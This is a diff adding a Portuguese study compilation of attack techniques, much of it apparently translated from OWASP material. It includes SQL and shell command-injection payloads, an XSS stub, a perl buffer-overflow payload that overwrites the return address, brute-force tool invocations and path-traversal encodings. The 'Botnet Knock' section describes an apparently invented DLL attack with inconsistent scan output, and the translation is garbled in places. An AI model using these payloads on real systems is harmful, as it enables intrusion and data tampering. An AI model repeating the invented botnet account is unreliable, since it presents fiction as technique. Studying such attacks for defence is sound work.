@@ -1,0 +1,3278 @@
+Esse arqv. contem um compilado de +58 tipos de Ataques para estudo, feito para todos os níveis - básico ao avançado.
+Bom estudos! :)
+
+AVISO! Eu não me responsabilizo pelos seus atos, esse arqv. tem o intuito educacional e a forma que você aplicar será da sua preocupação.
+
+
+COMEÇO ############################# 
+@ Adulteração de Parâmetros:
+
+Descrição
+
+O ataque de Adulteração de Parâmetros Web se baseia na manipulação de parâmetros trocados entre cliente e servidor, a fim de modificar os dados do aplicativo, tais como credenciais de usuários e permissões, preço e quantidade de produtos, etc. Normalmente, essas informações são armazenadas em cookies, forma oculta campos, ou sequências de consulta de URL e é usada para aumentar a funcionalidade e controle de aplicativos.
+Este ataque pode ser executado por um usuário mal-intencionado que quer explorar a aplicação em seu próprio benefício, ou um atacante que deseja atacar uma terceira pessoa usando um ataque Man-in-the-middle. Em ambos os casos, as ferramentas gostam de WebScarab e Paros Proxy que são utilizados principalmente.
+O sucesso de ataque depende da integridade e validação de erros mecanismo de lógica, e sua exploração pode resultar em outras conseqüências, incluindo XSS, Injeção SQL, inclusão de arquivos, e os ataques de divulgação de caminho.
+Para um pequeno vídeo que descreve a vulnerabilidade: http://www.youtube.com/watch?v=l5LCDEDn7FY&hd=1 (Cortesia de Checkmarx)
+
+Exemplos
+
+Exemplo 1 ~
+A modificação dos parâmetros dos campos de formulário pode ser considerado como um exemplo típico do ataque de aldulteração de parâmetros.
+Por exemplo, considere um usuário que pode selecionar valores de campo de formulário (caixa de combinação, caixa, etc cheque) em uma página do aplicativo. Quando esses valores são submetidos pelo usuário, que podem ser adquiridos e arbitrariamente manipulados por um invasor.
+
+Exemplo 2 ~
+Quando uma aplicação web usa campos ocultos para armazenar as informações de status, um usuário malicioso pode mexer com os valores armazenados no seu navegador e alterar as informações a que se refere. Por exemplo, um e-commerce site de compras usa campos ocultos para se referir aos seus itens, como segue:
+
+<input type=”hidden” id=”1008” name=”cost” value=”R$ 70,00”>
+
+
+Nesse exemplo, o atacante pode modificar a informação do valor "value" de um item específicado reduzindo assim o seu custo.
+
+
+Exemplo 3 ~
+Um atacante pode manipular parâmetros de URL diretamente. Por exemplo, considere uma aplicação web que permite que um usuário selecione seu perfil a partir de uma caixa de combinação e de débito na conta:
+
+http://www.attackbank.com/default.asp?profile=741&debit=1000
+
+Neste caso, um invasor pode adulterar a URL, utilizar outros valores para o perfil e débito:
+
+http://www.attackbank.com/default.asp?profile=852&debit=2000
+
+Outros parâmetros podem ser alterados, incluindo parâmetros de atributo. No exemplo a seguir, é possível mexer com a variável de estado e excluir uma página do servidor:
+
+http://www.attackbank.com/savepage.asp?nr=147&status=read
+
+Modificando o status da variável para deletar a página:
+
+http://www.attackbank.com/savepage.asp?nr=147&status=del
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Ataque de Lock Account
+
+Descrição
+
+Em um ataque de bloqueio de conta, um atacante tenta bloquear contas de usuário propositadamente não o processo de autenticação tantas vezes quanto necessárias para acionar a funcionalidade de bloqueio de conta. Este por sua vez, impede até mesmo o usuário válido de obter acesso à sua conta. Por exemplo, se um bloqueio de conta política diz que os usuários sejam bloqueados de suas contas depois de três tentativas de login, um atacante pode bloquear contas deliberadamente enviando uma senha inválida três vezes. Em grande escala, este ataque pode ser usado como um método no lançamento de um ataque de negação de serviço em muitas contas. O impacto de um tal ataque é agravado quando existe uma quantidade significativa de trabalho necessária para desbloquear as contas para permitir aos utilizadores tentam autenticar novamente.
+
+
+Exemplos
+
+eBay Ataque de bloqueio de conta
+Ao mesmo tempo, eBay exibe o user-id do maior lance para um determinado leilão. Nos minutos finais do leilão, um atacante que faltava para vencer o atual maior lance poderia tentar autenticar três vezes usando a conta alvejado. Depois de três tentativas de autenticação deliberadamente incorretas, estrangulando a senha, eBay iria bloquear a conta do mais alto licitante durante um determinado período de tempo. Um invasor pode então fazer o seu próprio lance e que o usuário legítimo não teria a chance de colocar uma contra-proposta porque seria bloqueado de sua conta.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Ataque de Injeção de comentário
+
+Descrição
+
+Comentários injetados em uma aplicação através da entrada pode ser usado para comprometer um sistema. Como os dados são analisados​​, um comentário injetado / incorreto pode causar o processo de tomar ações inesperadas que resultam em um ataque.
+
+Exemplos
+
+O atacante poderá realizar este tipo de ataque com programação diferente ou linguagens de script:
+Base de dados:
+Se o atacante tem a capacidade de manipular consultas que são enviadas para o banco de dados, ele é capaz de injetar um caractere de terminação também. O resultado é que a interpretação da consulta será interrompido no caractere de terminação:
+
+SELECT body FROM items WHERE id = $ID limit 1;
+
+Vamos supor que o atacante enviou através do método GET os seguintes dados armazenados na variável $ ID:
+
+"1 or 1=1; #"
+
+No final, o formulário de consulta final é:
+
+SELECT body FROM items WHERE id = 1 or 1=1; # limit 1;
+
+Depois de tudo o caráter # serão descartadas pelo banco de dados, incluindo "um limite", portanto, apenas a última coluna "corpo" com todos os seus registros serão recebidos como uma resposta de consulta.
+As sequências que podem ser utilizadas para comentar consultas:
+* MySQL: #, -
+* MS SQL: -
+* MS Access: 00% (Escarro!)
+* Oracle: -
+
+Byte nulo:
+Para comentar algumas partes das consultas, o invasor pode usar as seqüências normais, típicas de uma dada língua, ou encerrar as consultas usando seus próprios métodos que estão sendo limitadas apenas pela sua imaginação. Um exemplo interesing é um método byte nulo usado para comentar tudo depois da consulta atual em bancos de dados MS Access. Mais informações podem ser encontradas no Código de Incorporação nulo.
+Shell:
+Shell (bash) também tem o caractere #, que termina interpretação.
+Por exemplo:
+find.php
+
+<?
+$ =sth $_GET['what];
+system("/usr/bin/find -name '$sth' -type f");
+?>
+
+Usando / find.php o = * "% 20% 23 o atacante irá ignorar limitação" do tipo f "e esse comando?:
+
+/usr/bin/find -name '*' -type f
+
+vai virar: 
+
+/usr/bin/find -name '*' #-type f
+
+Assim, a forma final do comando é:
+
+/usr/bin/find -name '*'
+
+
+HTML (injeção):
+Se não há restrições sobre quem é capaz de inserir comentários, em seguida, usando a tag de comentário start:
+
+<!--
+
+é possível comentar o resto do conteúdo exibido no site.
+invisible.php
+
+<?php
+print "hello!: ";
+print $_GET['user'];
+print " Welcome friend!";
+?>
+
+Depois:
+
+GET /invisible.php?user=<!--
+
+E o resultado fica:
+
+hello!:
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Ataque de Repúdio
+
+Descrição
+
+Um ataque de repúdio acontece quando um aplicativo ou sistema não adotar controles para monitorar adequadamente e ações dos usuários logados, permitindo assim a manipulação maliciosa ou forjar a identificação de novas ações. Este ataque pode ser usado para alterar as informações de autoria de ações executadas por um usuário mal-intencionado, a fim de registrar os dados errados para arquivos de log. A sua utilização pode ser estendido para a manipulação de dados, em geral, o nome de outros, de uma maneira semelhante como mensagens de correio de falsificação. Se este ataque ocorre, os dados armazenados em arquivos de log podem ser considerados inválidos ou enganosas.
+
+
+Exemplos
+
+Considere uma aplicação web que faz o controle de acesso e autorização baseada em SESSIONID, mas registra as ações do usuário com base em um parâmetro definido pelo usuário no cabeçalho Cookie, da seguinte forma:
+
+
+ POST http://someserver/Upload_file.jsp HTTP/1.1
+ Host: tequila:8443
+ User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.4)   
+ Gecko/20070515 Firefox/2.0.0.4
+ Accept:
+ text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+ Accept-Language: en-us,en;q=0.5
+ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+ Keep-Alive: 300
+ Connection: keep-alive
+ Referer: http://someserver/uploads.jsp
+ Cookie: JSESSIONID=EE3BD1E764CD6EED280426128201131C;  
+ user=leonardo
+ Content-Type: multipart/form-data; boundary=--------------------------- 
+ 263152394310685
+ Content-Length: 321
+
+
+E o arquivo de log é composto por:
+
+
+Data, Hora, IP fonte, Porta da fonte, requisição e usuário. 
+Uma vez que as informações do usuário são adquiridos a partir de parâmetro de usuário no cabeçalho HTTP, um usuário mal-intencionado pode fazer uso de um proxy local (por exemplo: paros) e alterá-lo por um nome conhecido ou desconhecido.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Ataque de sessão sequestrada (HIJACKING)
+
+Descrição
+
+O ataque de Sessão Sequestro consiste na exploração do mecanismo de controle de sessão web, que normalmente é gerida por um token de sessão.
+Como a comunicação http usa muitas conexões TCP diferentes, o servidor web precisa de um método para reconhecer as conexões de cada usuário. O método mais útil depende de um sinal que o servidor Web envia para o navegador do cliente após a autenticação do cliente bem-sucedida. Um símbolo de sessão é normalmente composto por uma cadeia de largura variável, e pode ser utilizado de maneiras diferentes, como no URL, no cabeçalho da requisição HTTP como um biscoito, em outras partes do cabeçalho do pedido HTTP, ou ainda no corpo da requisição HTTP.
+
+O ataque Hijacking compromete o token de sessão roubando ou prevendo um token de sessão válido para ganhar acesso não autorizado ao servidor web.
+O token de sessão pode ser comprometido em diferentes maneiras, a mais comum são:
+- Token de sessão previsível;
+- Sessão de Sniffing;
+- Ataques do lado do cliente (XSS, códigos JavaScript maliciosos, trojans, etc);
+- O ataque Man-in-the-middle
+- O ataque Man-in-the-browser
+
+Exemplos
+
+Exemplo 1 ~
+Sessão Sniffing
+No exemplo, como podemos ver, pela primeira vez o atacante usa um sniffer para capturar uma sessão de token válido chamado "ID Session", então ele usa a sessão token válida para ganhar acesso não autorizado ao servidor web. Imagem: https://www.owasp.org/images/c/cb/Session_Hijacking_3.JPG
+
+Exemplo 2 ~
+Ataque de script cross-site
+O atacante pode comprometer o token de sessão por meio de um código malicioso ou programas em execução no lado do cliente. O exemplo mostra como o atacante poderia usar um ataque de XSS para roubar o token de sessão. Se um atacante envia um link criado para a vítima com o JavaScript malicioso, quando a vítima clica no link, o JavaScript será executado e siga as instruções feitas pelo atacante. O exemplo da figura 3 usa um ataque XSS para mostrar o valor do cookie da sessão atual, usando a mesma técnica é possível criar um código JavaScript específico que irá enviar o cookie para o atacante.
+Alerta <SCRIPT> (Document); </ SCRIPT> [INJEÇÃO DE CÓDIGO, IMAGEM = https://www.owasp.org/images/b/b6/Code_Injection.JPG]
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Ataque de estouro de buffer
+
+Descrição
+
+Erros de buffer overflow são caracterizadas pela substituição de fragmentos de memória do processo, o que nunca deveria ter sido modificados intencionalmente ou não. Substituição de valores do IP (Instruction Pointer), BP (Base Pointer) e outros registros provocam exceções, falhas de segmentação, e que outros erros ocorram. Geralmente estes erros de execução final da aplicação de uma forma inesperada. Erros de buffer overflow ocorre quando operamos em buffers do tipo char.
+Erros Bo (nome comum para este tipo de erros) são simplesmente estouro de pilha ou heap em erros de estouro. Não fazemos distinção entre estes dois neste artigo para evitar a confusão do leitor.
+A seguir exemplos são escritos em linguagem C sob o sistema GNU / Linux em arquitetura x86.
+
+Exemplo 1
+
+  #include <stdio.h>
+  int main(int argc, char **argv)
+  {
+  char buf[8]; // buffer for eight characters
+  gets(buf); // read from stdio (sensitive function!)
+  printf("%s\n", buf); // print out data stored in buf
+  return 0; // 0 as return value
+  }
+
+Esta aplicação muito simples lê da entrada padrão um array de caracteres e copia para o buffer do tipo char. O tamanho desta reserva é de oito caracteres. Depois disso, o conteúdo do buffer é exibido e sai do aplicativo.
+
+Compilação do programa:
+
+portalhacking@spin ~/inzynieria $ gcc bo-simple.c -o bo-simple
+  /tmp/ccECXQAX.o: In function `main':
+  bo-simple.c:(.text+0x17): warning: the `gets' function is dangerous and
+  should not be used.
+
+Nesta fase, mesmo que o compilador sugira que a função obtenha () não é segura.
+Exemplo de uso:
+
+ portalhacking@spin ~/inzynieria $ ./bo-simple // program start
+  1234 // we eneter "1234" string from the keyboard
+  1234 // program prints out the conent of the buffer
+  rezos@spin ~/inzynieria $ ./bo-simple // start
+  123456789012 // we eneter "123456789012"
+  123456789012 // content of the buffer "buf" ?!?!
+  Segmentation fault // information about memory segmenatation fault
+
+Nós gerenciamos, (in)felizmente para executar a operação com defeito pelo programa, e provocá-lo a sair de forma anormal.
+Análise do problema:
+
+O programa chama uma função, que opera no buffer tipo char e não faz nenhuma verificação contra estar transbordando o tamanho atribuído a esse buffer. Como resultado, é possível que, intencionalmente ou não armazene mais dados do buffer, o que vai causar um erro. Surge a seguinte questão: O buffer armazena apenas oito personagens, então por que a função printf () Exibe doze?. A resposta vem da organização da memória do processo. Quatro personagens que transbordaram do buffer também substituir o valor armazenado em um dos registros, o que era necessário para o retorno da função correta. Memória continuidade resultou em imprimir os dados armazenados na área de memória.
+
+Exemplo 2
+
+  #include <stdio.h>
+  #include <string.h>
+
+  void doit(void)
+  {
+          char buf[8];
+
+          gets(buf);
+          printf("%s\n", buf);
+  }
+
+  int main(void)
+  {
+          printf("So... The End...\n");
+          doit();
+          printf("or... maybe not?\n");
+
+          return 0;
+  }
+
+Este exemplo é análogo ao primeiro. Além disso, antes e depois da função doit (), temos duas chamadas para função printf ().
+
+ Compilation:
+
+  portalhacking@dojo-labs ~/owasp/buffer_overflow $ gcc example02.c -o example02
+  -ggdb
+  /tmp/cccbMjcN.o: In function `doit':
+  /home/rezos/owasp/buffer_overflow/example02.c:8: warning: the `gets'
+  function is dangerous and should not be used.
+
+  Usage example:
+  rezos@dojo-labs ~/owasp/buffer_overflow $ ./example02
+  So... The End...
+  TEST                   // user data on input
+  TEST                  // print out stored user data
+  or... maybe not?
+
+
+
+O programa define entre as duas chamadas printf () mostra o conteúdo da memória intermédia, que é preenchida com os dados introduzidos pelo utilizador.
+
+portalhacking@dojo-labs ~/owasp/buffer_overflow $ ./example02
+  So... The End...
+  TEST123456789
+  TEST123456789
+  Segmentation fault
+
+Porque o tamanho do buffer foi definido (char buf [8]) e foi preenchido com treze caracteres do tipo char, o buffer transbordou.
+Se o nosso pedido de binário está no formato ELF, então somos capazes de usar um programa para analisar objdump-lo e encontrar informações necessárias para explorar o erro de estouro de buffer.
+Abaixo encontra-se de saída produzido pelo objdump. Desde que a produção, somos capazes de encontrar endereços, onde printf () é chamado (0x80483d6 e 0x80483e7).
+
+ portalhacking@dojo-labs ~/owasp/buffer_overflow $ objdump -d ./example02
+
+  080483be <main>:
+   80483be:       8d 4c 24 04             lea    0x4(%esp),%ecx
+   80483c2:       83 e4 f0                and    $0xfffffff0,%esp
+   80483c5:       ff 71 fc                pushl  0xfffffffc(%ecx)
+   80483c8:       55                      push   %ebp
+   80483c9:       89 e5                   mov    %esp,%ebp
+   80483cb:       51                      push   %ecx
+   80483cc:       83 ec 04                sub    $0x4,%esp
+   80483cf:       c7 04 24 bc 84 04 08    movl   $0x80484bc,(%esp)
+   80483d6:       e8 f5 fe ff ff          call   80482d0 <puts@plt>
+   80483db:       e8 c0 ff ff ff          call   80483a0 <doit>
+   80483e0:       c7 04 24 cd 84 04 08    movl   $0x80484cd,(%esp)
+   80483e7:       e8 e4 fe ff ff          call   80482d0 <puts@plt>
+   80483ec:       b8 00 00 00 00          mov    $0x0,%eax
+   80483f1:       83 c4 04                add    $0x4,%esp
+   80483f4:       59                      pop    %ecx
+   80483f5:       5d                      pop    %ebp
+   80483f6:       8d 61 fc                lea    0xfffffffc(%ecx),%esp
+   80483f9:       c3                      ret
+   80483fa:       90                      nop
+   80483fb:       90                      nop
+
+
+Se a segunda chamada para printf () deve informar o administrador sobre o logout do usuário (por exemplo, sessão fechada), então podemos tentar omitir esta etapa e terminar sem a chamada para printf ().
+
+portalhacking@dojo-labs ~/owasp/buffer_overflow $ perl -e 'print "A"x12
+."\xf9\x83\x04\x08"' | ./example02
+So... The End...
+AAAAAAAAAAAAu*.
+Segmentation fault
+
+A aplicação terminar sua execução com falha de segmentação, mas a segunda chamada para printf () não teve lugar.
+Algumas palavras de explicação:
+perl-e 'print "A" x12 "\ XF9 \ x83 \ x04 \ x08".' - irá imprimir doze caracteres "A" e, em seguida, quatro personagens, que são na verdade um endereço da instrução que deseja executar. Por doze anos?
+
+ 8 // size of buf (char buf[8])
+  +  4 // four additional bytes for overwriting stack frame pointer
+  ----
+    12
+
+Análise do problema:
+A questão é o mesmo que no primeiro exemplo. Não existe controle sobre o tamanho do buffer de copiado para o anteriormente declarado. Neste exemplo, substituir o registo EIP com o endereço 0x080483f9, que é na verdade uma chamada para ret na última fase da execução do programa.
+Como usar erros de estouro de buffer de uma maneira diferente?
+Geralmente, a exploração desses erros pode levar a:
+* Aplicação DoS
+* Reorganização da execução de funções
+* Execução de código (se está apto a shellcode, descrita em um documento separado)
+
+Como os erros de estouro de buffer são feitos?
+Estes tipos de erros são muito fáceis de fazer. Durante anos, eles eram o pesadelo de um programador. O problema reside em funções C nativas, que não se importam em fazer verificações de comprimento tampão adequadas. Abaixo está a lista de tais funções e, se existirem, os seus equivalentes de segurança:
+
+* gets() -> fgets() - read characters
+* strcpy() -> strncpy() - copy content of the buffer
+* strcat() -> strncat() - buffer concatenation
+* sprintf() -> snprintf() - fill buffer with data of different types
+* (f)scanf() - read from STDIN
+* getwd() - return working directory
+* realpath() - return absolute (full) path
+
+Use funções equivalentes seguras, que verificam o comprimento buffers, sempre que possível. a saber:
+
+1- gets() -> fgets()
+2- strcpy() -> strncpy()
+3- strcat() -> strncat()
+4- sprintf() -> snprintf()
+
+Essas funções que não tem equivalentes seguros deve ser reescrito com verificações de segurança implementadas. Tempo gasto no que vai beneficiar no futuro. Lembre-se que você tem que fazê-lo apenas uma vez.
+Use compiladores, que são capazes de identificar as funções inseguras, erros de lógica e verifique se a memória é substituído quando e onde ele não deveria estar.
+############################# FIM
+
+
+
+
+
+COMEÇO ############################# 
+@ Ataque de Força Bruta
+
+Descrição
+
+Durante este tipo de ataque, o atacante está tentando contornar os mecanismos de segurança ao ter conhecimento mínimo sobre eles. Usando um ou mais métodos acessíveis: ataque de dicionário (com ou sem mutações), ataque de força bruta (com determinadas classes de personagens, por exemplo: alfanumérico, especial, caso (in) sensível) que o atacante está tentando alcançar seu/sua meta. Considerando-se um método estabelecido, o número de tentativas, a eficiência do sistema, o qual realiza o ataque e eficácia estimada do sistema que é atacada, o atacante for capaz de calcular o tempo que o ataque deverá durar. Ataques de força bruta, por outro lado, que inclui todas as classes de personagens, não dá nenhuma certeza de sucesso.
+
+Exemplos
+
+Ataques de força bruta são usados​​principalmente para adivinhar senhas e ignorando o controle de acesso. No entanto, existem uma série de ferramentas que utilizam esta técnica para examinar estruturas catálogo do serviço web e procurar interessante, do ponto de vista do atacante, a informação. Muitas vezes, o alvo de um ataque são dados em formulários (GET / POST) e usuários "Session-IDs.
+
+Exemplo 1 ~
+No primeiro scenerio, onde o objetivo de força bruta é saber a senha em sua forma decifrada, pode parecer que John the Ripper é uma ferramenta muito útil. Os TOP10 ferramentas para quebra de senhas com diferentes métodos, incluindo a força bruta, pode ser encontrado na http://sectools.org/crackers.html.
+
+Para testar os serviços web existem ferramentas como:
+- Dirb (http://sourceforge.net/projects/dirb/)
+- WebRoot (http://www.cirt.dk/tools/webroot/WebRoot.txt)
+
+Dirb pertence a ferramentas mais avançadas. Com a sua ajuda, somos capazes de:
+
+- Definir cookies
+- Adicionar qualquer cabeçalho HTTP
+- Usar proxy
+- Objetos sofrem mutações que foram encontrados
+- (S) conexões http teste
+- Procurar catálogos e / ou arquivos usando dicionários e modelos definidos
+- E muito mais
+
+O teste é mais simples de realizar:
+
+"portal@hacking ~/d/owasp_tools/dirb $ ./dirb http://testsite.test/
+-----------------
+DIRB v1.9
+By The Dark Raver
+-----------------
+START_TIME: Mon Jul  9 23:13:16 2007
+URL_BASE: http://testsite.test/
+WORDLIST_FILES: wordlists/common.txt
+SERVER_BANNER: lighttpd/1.4.15
+NOT_EXISTANT_CODE: 404 [NOT FOUND]
+(Location: '' - Size: 345)
+
+-----------------
+
+Generating Wordlist...
+Generated Words: 839
+
+---- Scanning URL: http://testsite.test/ ----
+FOUND: http://testsite.test/phpmyadmin/
+       (***) DIRECTORY (*)
+
+Na saída do atacante é informado que o catálogo phpmyadmin / foi encontrado. O atacante, sabe que agora é capaz de realizar o ataque a esta aplicação. Em modelos de dirb há, entre outros, um dicionário contendo informações sobre a configuração httpd inválido. Este dicionário irá detectar pontos fracos desse tipo.
+
+Um dos principais problemas com ferramentas de reconhecimento como dirb  é dada se a resposta do servidor é esperado e viável. Com a configuração do servidor mais avançado (por exemplo, com mod_rewrite) ferramentas automáticas não são capazes de determinar se a resposta do servidor informa sobre um erro ou que o arquivo, que o atacante é depois, foi encontrado.
+
+O WebRoot.pl aplicação, escrito por CIRT.DK, tem incorporado mecanismos para analisar respostas do servidor, e com base na frase especificada pelo atacante, medidas se a resposta do servidor é esperado.
+Por exemplo:
+
+Np.
+./WebRoot.pl -noupdate -host testsite.test -port 80 -verbose -match "test" -url "/private/<BRUTE>" -incremental lowercase -minimum 1 -maximum 1
+
+"oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00
+o          Webserver Bruteforcing 1.8          o
+0  ************* !!! WARNING !!! ************  0
+0  ******* FOR PENETRATION USE ONLY *********  0
+0  ******************************************  0
+o       (c)2007 by Dennis Rand - CIRT.DK       o
+oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00"
+
+WebRoot.pl encontrado um arquivo "/ private / b" em testsite.test, que contém a frase "teste".
+
+Outro exemplo é o de examinar as gamas de valores da variável:
+
+./WebRoot.pl -noupdate -host testsite.test -port 80 -verbose -diff "Error" -url "/index.php?id=<BRUTE>" -incremental integer -minimum 1 -maximum 1
+
+Ferramentas de defensivas ~
+
+Detector php-Brute-Force-Attack
+http://yehg.net/lab/pr0js/files.php/php_brute_force_detect.zip
+Detecta seus servidores web a ser examinadas pelo ferramentas de força bruta, como WFuzz, OWASP DirBuster e scanners de vulnerabilidade, como o Nessus, Nikto, Acunetix, etc .. Isso ajuda você a identificar rapidamente sondagem provável pelos bandidos que querem se aprofundar nas possíveis falhas de segurança.
+http://yehg.net/lab/pr0js/tools/php-brute-force-detector-readme.pdf
+############################# FIM
+
+
+
+
+
+
+COMEÇO #############################
+@ Ataque Man-in-the-browser
+
+Descrição
+
+O ataque Man-in-the-Browser é a mesma abordagem como o ataque Man-in-the-middle, mas, neste caso, um cavalo de tróia é usado para interceptar e manipular chamadas entre executável principal do aplicativo (ex: o navegador) e seu mecanismos de segurança ou bibliotecas on-the-fly.
+O objetivo mais comum deste ataque é causar fraude financeira através da manipulação de transações de sistemas de Internet Banking, mesmo quando outros fatores de autenticação estão em uso.
+Um cavalo de Tróia instalado anteriormente é utilizado para atuar entre o navegador e o mecanismo de segurança do navegador, farejar ou modificar transaçõe como elas são formadas no navegador, mas ainda exibindo de volta a operação pretendida do usuário.
+Normalmente, a vítima deve ser inteligente, a fim de perceber um sinal de tal ataque enquanto ele está acessando uma aplicação web como uma conta de internet banking, mesmo na presença de canais SSL, pois todos os controles esperados e mecanismos de segurança são exibidos e funcionam normalmente.
+
+Pontos de Efeito:
+
+* Objetos auxiliares do navegador - bibliotecas carregadas dinamicamente pelo Internet Explorer na inicialização.
+* Extensões - o equivalente a Objetos auxiliares do navegador para navegador Firefox
+* API-Conectando - esta é a técnica usada por Man-in-the-Browser para executar sua Man​​-in-the-Middle entre o aplicativo executável (EXE) e suas bibliotecas (DLL).
+* Javascript - Ao utilizar um worm Ajax malicioso, conforme descrito no Ajax Sniffer - Proof of Concept (http://myappsecurity.blogspot.com/2007/01/ajax-sniffer-prrof-of-concept.html)
+
+Exemplos
+
+Manipulação através da interface DOM ~
+1. O Trojan infecta o software do computador, ou sistema operacional ou aplicativo.
+2. O Trojan instala uma extensão para a configuração do navegador, de modo que ele será carregado na próxima vez que o navegador for iniciado.
+3. Em algum tempo depois, o usuário reinicia o browser.
+4. O navegador carrega a extensão.
+5. A extensão registra um manipulador para cada carga página.
+6. Toda vez que uma página é carregada, a URL da página é procurada pela extensão contra uma lista de sites conhecidos direcionados para o ataque.
+7. O usuário se conecta com segurança para, por exemplo, https://seguro.original.site/.
+8. Quando o manipulador de detectar uma página de carregamento para um padrão específico na sua lista específica (por exemplo https://seguro.original.site/conta/confirmar_transação) registra um manipulador de eventos do botão.
+9. Quando o botão submit (feito, concluir) for pressionado, a extensão extrai todos os dados de todos os campos do formulário através da interface DOM no browser, e lembra os valores.
+10. A extensão modifica os valores através da interface de DOM.
+11. A extensão diz ao navegador para continuar a enviar o formulário para o servidor.
+12. O navegador envia o formulário, incluindo os valores modificados, para o servidor.
+13. O servidor recebe os valores modificados na forma como um pedido normal. O servidor não pode diferenciar entre os valores originais e os valores modificados, ou detectar as alterações.
+14. O servidor executa a transação e gera um recibo.
+15. O navegador recebe o recibo da transação modificada.
+16. A extensão detecta a URL https://seguro.original.site/conta/receber, varre o código HTML para os campos de recebimento, e substitui os dados modificados no recibo com os dados originais que lembrado no HTML.
+17. O navegador exibe o recebimento modificado com os detalhes originais.
+18. O usuário pensa que a transação original foi recebida pelo servidor intacta e autorizada corretamente.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Ataque Man-in-the-middle
+
+https://docs.google.com/document/d/1aY1xLB2VRMJtjrWt868Z6bfvtkqGVje5TgRkiMKVGl8/edit?usp=sharing
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Botnet Knock 
+
+Visão Global
+
+A Botnet de Knock não funciona como uma Botnet comum, ela funciona de uma forma especial, mais eficaz porém complexa de se usufruir. 
+
+Descrição
+
+A Botnet no caso da de Knock é um arquivo, geralmente DLL (.dll) criado mais provavelmente por um programador, com o intuito de tirar um site do ar, cortando todas as conexões ativas do site. A BNK (Botnet de Knock) quando ativada dentro de um site, pode tirá-lo do ar, para sempre, e ele pode ficar eternamente indisponível até mesmo para o Administrador do mesmo. O ataque consiste no que o autor pega o arquivo da BNK (que muda sempre de variável e função conforme o computador do atacante, o programador autor do arquivo e site alvo, então nunca há uma BNK comum que você pode baixar e usar), depois disso, ele usa algum tipo de ataque ou Injeção para invadir o banco de dados ou servidor (FTP, HOST, CLOUD etc) onde ele deixa o arquivo malicioso (também pode ser interpretado como um "vírus", apesar de não possuir a carácteristica de um, e nem ter vírus). Depois que o arquivo malicioso (BNK) é estabelecida dentro do site, o autor usa de um Injetor de DLL em execução (.exe) e ativa as funções do arquivo, que quando ativado ele corta todas as conexões com o site.
+
+Exemplos
+
+Exemplo 1 ~
+
+A seguir, veremos um scan (executado por um executador ativo em PYTHON) de um site normal antes de ter a BNK ativada dentro de si. No caso o site tem 3 conexões ativas, a do host onde ele hospeda o site (HOSTGATOR SYS NO CASO), a da hospedagem padrão onde ele elaborou o site (BLOGGER) e a conexão de domínio, onde ele mantém o site - que no caso é diferente pois não utiliza o mesmo serviço de hospedagem do site (UOL HOST):
+
+
+
+Slytherin@unix ~ > SCANNING CONNECTIONS 
+> scan.py -f 131.253.14.85 --ap [SCAN FOR 131.253.14.83 --ALLPORTS]
+
+Connection 1 131.253.14.85 - HostGator Sys  | ESTABLISHED
+Connection 2 131.253.14.85 - Blogger, Google | ESTABLISHED
+Connection 3 131.253.14.85 - UOL HOST BR | ESTABLISHED
+
+
+
+
+Agora veremos o scan do site, DEPOIS de a BNK ser ativada:
+
+
+
+Slytherin@unix ~ > SCANNING CONNECTIONS 
+> scan.py -f 131.253.14.85 --ap [SCAN FOR 131.253.14.83 --ALLPORTS]
+
+Connection 1 131.253.14.85 - HostGator Sys  | WAIT_ANS
+Connection 2 131.253.14.85 - Blogger, Google | OFFLINE
+Connection 3 131.253.14.85 - UOL HOST BR | WAIT_ANS
+
+
+Como pudemos ver, o site está aguardando conexão, que no caso não está ativa, pois o servidor principal do site (Blogger) cortou as conexões diretas com todos os outros príncipios ativos com o site e banco de dados.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Caminho Transversal
+
+Visão Geral
+
+O Ataque de Caminho Transversal pretende acessar os arquivos e diretórios que são armazenados fora da pasta raiz web. Ao navegar no aplicativo, o atacante procura por links absolutos para arquivos armazenados no servidor web. Por variáveis​que manipulam arquivos de referência com "dot-dot-slash (.. /)" seqüências e suas variações, é possível acessar arquivos arbitrários e diretórios armazenados no sistema de arquivos, incluindo o código fonte da aplicação, configuração e arquivos de sistema críticos, limitados pelo sistema de controle de acesso operacional. O atacante usa sequências ".. /" de mover-se para o diretório raiz, permitindo assim a navegação pelo sistema de arquivos.
+Este ataque pode ser executado com um código malicioso externo injetado no caminho, como o ataque de injeção de recursos. Para executar este ataque não é necessário o uso de uma ferramenta específica, os atacantes costumam usar uma aranha / rastreador para detectar todas as URLs disponíveis.
+Este ataque também é conhecido como "dot-dot-slash", "passagem de diretório", "diretório escalada" e "retrocesso".
+
+Descrição
+
+Variações Pedido ~
+Codificação e dupla codificação:
+
+
+
+%2e%2e%2f represents ../
+%2e%2e/ represents ../
+..%2f represents ../ 
+%2e%2e%5c represents ..\
+%2e%2e\ represents ..\ 
+..%5c represents ..\ 
+%252e%252e%255c represents ..\ 
+..%255c represents ..\ and so on. 
+
+
+
+Codificação por cento (codificação de URL aka) ~
+Note-se que os recipientes web executam um nível de decodificação em valores codificados por cento de formulários e URLs.
+
+
+
+..%c0%af represents ../ 
+..%c1%9c represents ..\ 
+
+
+
+SO específico ~
+UNIX
+
+Root directory:  “ / “ 
+Directory separator: “ / “
+
+
+WINDOWS
+
+Root directory: “  <partition letter> : \ “
+Directory separator: “ / “ or “ \ ” 
+Note that windows allows filenames to be followed by extra . \ / characters.
+
+
+Em muitos sistemas operacionais, null bytes %00 pode ser injetado para terminar o nome do arquivo. Por exemplo, o envio de um parâmetro como:
+
+
+?file=secret.doc%00.pdf
+
+
+resultará na aplicação Java vendo uma cadeia que termina com ". pdf" e o sistema operacional vai ver um arquivo que termina em ". doc". Os atacantes podem usar esse truque para contornar rotinas de validação.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
